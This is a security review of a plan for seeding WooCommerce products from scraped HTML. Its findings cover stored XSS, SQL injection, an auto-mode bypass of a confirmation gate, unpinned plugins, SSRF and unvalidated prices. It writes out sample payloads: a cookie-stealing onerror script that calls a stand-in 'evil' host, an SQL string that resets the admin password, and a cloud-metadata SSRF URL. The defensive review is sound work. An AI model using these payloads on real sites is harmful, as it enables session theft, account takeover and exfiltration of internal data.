# Red-Team Security Review — WooCommerce Catalog Build Extension (SP1)

Reviewer lens: Security Adversary + Fact Checker. All findings grep-verified against the codebase.

## Finding 1: Stored XSS — scraped product descriptions seeded raw, WP-CLI runs as admin (unfiltered_html)
**Severity:** Critical
**Location:** phase-01-schema-contract.md:38-44; phase-06-seeding.md:33-37; scripts/seed-helpers.sh:147-149
**Flaw:** The `commerce.catalog.products[].description` / `shortDescription` fields are declared as free strings with no sanitization contract (phase-01:38-44). Phase 6 seeds them via `wp wc product create --description=…` or the `wp post create --post_content=` fallback, mirroring `ensure_post`, which passes `--post_content="$content"` verbatim (seed-helpers.sh:147-149). No `wp_kses`/sanitization step exists anywhere in the seeding path (grep for `kses|sanitize|unfiltered_html` across `skills/ scripts/ references/` returns only output-side `esc_html` in theme templates, nothing on the seed input). WP-CLI executes as an admin context with `unfiltered_html`, so `<script>`/`onerror=` markup in a scraped description is stored verbatim and rendered on the public product/shop page.
**Failure scenario:** Scrape a competitor/attacker page whose product blurb contains `<img src=x onerror=fetch('//evil/'+document.cookie)>`. Pipeline seeds it into the WooCommerce product. Every visitor to `/shop/` or the single product page executes it — persistent XSS in the storefront, including any logged-in shop admin.
**Suggested fix:** Add an explicit sanitization contract in phase-01 (allow-list HTML for `description` via `wp_kses_post`, strip-all for `shortDescription`/`name`/`sku`). In phase-06, route description writes through `wp eval` calling `wp_kses_post()` (or pre-sanitize before the helper), not raw `--post_content`. State that scraped commerce content is untrusted, unlike theme-authored content.

## Finding 2: SQL injection in the documented `wp db query` fallback for product meta
**Severity:** Critical
**Location:** phase-06-seeding.md:24-26; skills/plugin-data-seeding/references/forms-seeding.md:81-89; references/manifest-contract.md:54-55
**Flaw:** Phase 6 lists a `wp post create … + meta` and raw-SQL "last resort … dry-run/SELECT preview" path for `_price`/`_regular_price`/`_sku` (phase-06:24-26). The only existing template for "guarded" raw SQL builds the statement by string interpolation with **no escaping**: `wp db query "UPDATE $(wp db prefix)postmeta SET meta_value='...' WHERE post_id=$form_id …"` (forms-seeding.md:87). Product `sku`, `regularPrice`, and `description` originate from untrusted scraped HTML. Interpolating any of them into that single-quoted SQL string injects.
**Failure scenario:** A product SKU scraped as `x'; UPDATE wp_users SET user_pass=MD5('pwned') WHERE ID=1;-- ` flows into `ensure_wc_product` → falls to the SQL path → admin password rewritten, or arbitrary table mutation, all running inside the WP DB with full privileges.
**Evidence (file:line):** forms-seeding.md:87 (`SET meta_value='...'`, no escaping); forms-seeding.md:46-47 (doc says "do not hand-serialize" but provides the injectable example anyway); manifest-contract.md:54-55 (contract only mandates `--dry-run` for "destructive ops", not parameter escaping).
**Suggested fix:** Forbid raw `wp db query` for any value derived from scraped content in this plan. Mandate `wp wc product create` / `wp post meta update` (argv-safe via the `wp_cli` array runner) or `wp eval` with `$wpdb->prepare()`. If SQL is truly unavoidable, require `$wpdb->prepare()` and document it in `woocommerce-seeding.md`.

## Finding 3: "Guarded dry-run per contract" is an unenforced human convention, not a control
**Severity:** High
**Location:** phase-06-seeding.md:26; brainstorm:108; references/manifest-contract.md:54-55; commands/build.md:46
**Flaw:** Phase 6 and the brainstorm repeatedly justify raw-SQL safety with "dry-run/SELECT preview first (per contract)" (phase-06:26, brainstorm:108). But `wp db query` has **no** `--dry-run` flag — the "guard" is a human reading a `SELECT` and deciding to proceed (forms-seeding.md:81-94). The new `ensure_wc_*` helpers run non-interactively inside a seed script, and `build.md --auto` "run[s] without per-stage gates" (build.md:19,46). There is no code path that blocks the `INSERT`/`UPDATE` when no human is present. The plan treats a manual review step as if it were an enforced safety mechanism.
**Failure scenario:** `/ck:build --auto --commerce` on scraped HTML seeds via the SQL fallback with zero human in the loop; the "preview" SELECT prints to a log nobody reads and the unescaped UPDATE (Finding 2) executes unsupervised.
**Suggested fix:** Either keep commerce seeding strictly on argv-safe WP-CLI/`wp eval` (no raw SQL at all in SP1), or make the helper refuse to run raw mutations unless an explicit interactive confirmation env flag is set. Do not cite the contract's manual preview as a guard for autonomous runs.

## Finding 4: Detection→install "mandatory user gate" is bypassable and only a markdown note
**Severity:** High
**Location:** phase-02-detection.md:71-72; plan.md:50-51; commands/build.md:19,45-46
**Flaw:** Phase 2 leans on "mandatory user gate after analyze (never auto-proceed to install Woo)" as the mitigation for false-positive detection (phase-02:71-72) and the whole-plan acceptance criteria depends on it (plan.md:50-51). But the gate is just a documentation instruction the model is asked to follow, and `build.md` explicitly states `--auto` "run[s] without per-stage gates (still gates ship on confirmation)" and step 4 says "In `--auto`, skip gates except ship" (build.md:19,45-46). So under `--auto` the confirmation never fires.
**Failure scenario:** A page with a price cluster (Finding triggers ≥2 heuristic signals) under `--auto` silently installs WooCommerce and seeds scraped product/category data with no confirmation — exactly the false-positive case the plan claims is mitigated, plus it carries the XSS/SQL payloads from Findings 1-2 straight into the DB.
**Suggested fix:** In phase-02, make the commerce-install decision a hard gate that is NOT skipped by `--auto` (treat installing a commerce plugin + seeding untrusted catalog like the ship gate, which `--auto` preserves). Update `build.md` to carve commerce confirm-on-install out of the `--auto` skip set.

## Finding 5: WooCommerce pinned as a bare, unversioned wporg slug — supply-chain / reproducibility risk
**Severity:** Medium
**Location:** phase-04-plugin-selection.md:31-34; skills/plugin-selection/SKILL.md:89-91; scripts/wp-env-bootstrap.sh:50-51
**Flaw:** Phase 4 adds `woocommerce` as a bare wporg slug and asserts it "flows through the existing `.wp-env.json` merge logic unchanged" (phase-04:31-34). Verified: the merge emits `[.plugins[] | select(.source=="wporg") | .slug]` — bare slug strings only (plugin-selection.md:89; wp-env-bootstrap.sh:50-51). WordPress core can be version-pinned via `.env.wpVersion` (wp-env-bootstrap.sh:45,56-57) but plugins have no equivalent — wp-env always installs the latest WooCommerce from wordpress.org with no version or integrity pin. WooCommerce is the highest-value plugin in the WP ecosystem and a frequent supply-chain target.
**Failure scenario:** A compromised or breaking WooCommerce release on wordpress.org is auto-installed on the next `wp-env start`; builds are non-reproducible and a malicious release executes in the build environment.
**Suggested fix:** Allow pinning the WooCommerce version (e.g. `woocommerce` slug + a version field, or a downloaded ZIP with a recorded checksum) in phase-04, and note the supply-chain trade-off rather than declaring "no premium ZIP handling needed."

## Finding 6: SSRF / image-source contradiction — `import_media` only handles local globs, but modeling maps scraped remote image URLs
**Severity:** High
**Location:** phase-06-seeding.md:36; phase-03-modeling.md:29; plan.md:78; scripts/seed-helpers.sh:259-273
**Flaw:** Phase 6 says "Reuse `import_media` (already dedupes by filename) for featured + gallery" (phase-06:36). But `import_media` iterates a **local-file glob** (`for f in $pattern; do [[ -f "$f" ]] || continue`, seed-helpers.sh:263-264) — it silently skips anything that is not an on-disk file. Phase 3 maps "card image → `images[0]`" from scraped HTML (phase-03:29), i.e. remote URLs, while plan.md:78 claims images "come from the `optimization` stage output" (local). The plan never reconciles these. Result: either product images are silently dropped (broken catalog), or an implementer "fixes" it by calling `wp media import <remote-url>` directly (wp media import accepts URLs) on attacker-controlled scraped URLs.
**Failure scenario:** Scraped gallery URL `http://169.254.169.254/latest/meta-data/iam/...` (or an internal service) is passed to `wp media import` → the WP container fetches it (SSRF), exfiltrating cloud metadata/internal responses into the media library.
**Suggested fix:** Resolve the contradiction explicitly: require that commerce image refs are local optimized-stage paths only, and have modeling/seeding reject or strip `http(s)://` image refs (or fetch them through the optimization stage with an allow-list), never pass a scraped URL to `wp media import`.

## Finding 7: No numeric/format validation of scraped prices before they reach WP-CLI/SQL
**Severity:** Medium
**Location:** phase-01-schema-contract.md:39; phase-03-modeling.md:29,71-72
**Flaw:** `regularPrice`/`salePrice` are declared in the schema with no type or numeric/format constraint (phase-01:39 lists them as bare fields), and modeling parses VND strings like `1.990.000₫` (phase-03:71-72) but defines no normalization to a canonical decimal before the value is handed to `wp wc product create --regular_price=` or the meta/SQL fallback. Phase 3 only says "do not invent prices" (leave empty), nothing about validating the ones it does extract.
**Failure scenario:** A scraped price `1.990.000` (thousands-dot locale) is stored as `1.99`, or a non-numeric/oversized token poisons the product; combined with Finding 2 it is also the injection vector. Catalog ships with wrong prices that pass every happy-path check.
**Suggested fix:** Add a `pattern`/numeric constraint on price fields in phase-01 and a deterministic VND/locale normalization rule (strip separators → canonical decimal, reject non-matching) in phase-03 before any WP-CLI/SQL write.

---

### Cross-cutting note (not a separate finding)
The plan's entire security posture for untrusted scraped data rests on three soft controls that this review shows are not real controls: a markdown "user gate" (`--auto` skips it, F4), a "guarded dry-run" with no enforcement (F3), and reuse of an existing helper that doesn't fit the data shape (F6). The argv-array `wp_cli` runner (seed-helpers.sh:55-57) *does* prevent shell command injection — that part is sound — but it does nothing for stored XSS (F1), SQL injection in the SQL fallback (F2), or SSRF (F6). SP1 should explicitly classify `commerce.catalog.*` as untrusted input and add sanitization/validation at the model→seed boundary.
